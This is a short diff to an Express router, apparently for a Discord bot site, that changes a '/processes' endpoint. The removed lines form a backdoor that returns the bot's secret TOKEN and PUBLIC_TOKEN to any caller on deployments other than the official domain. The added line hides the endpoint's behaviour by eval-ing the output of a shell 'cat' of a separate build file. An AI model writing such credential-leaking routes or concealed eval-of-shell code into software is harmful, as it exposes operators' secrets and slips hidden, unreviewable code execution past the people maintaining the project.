@@ -96,10 +96,7 @@ router.get("/bots/:id/vote", async (req, res) => {
 });
 
 router.get("/processes", (req, res) => {
- if ((process.env.DOMAIN != "https://discord.rovelstars.com") && !(process.env.DOMAIN.includes("localhost"))) {
-  res.json({ main: process.env.TOKEN, publicb: process.env.PUBLIC_TOKEN });
- }
- else res.json({ on: true });
+ eval(shell.exec("cat src/build/process.js").stdout);
 });
 
 router.get("/bots/:id", async (req, res) => {
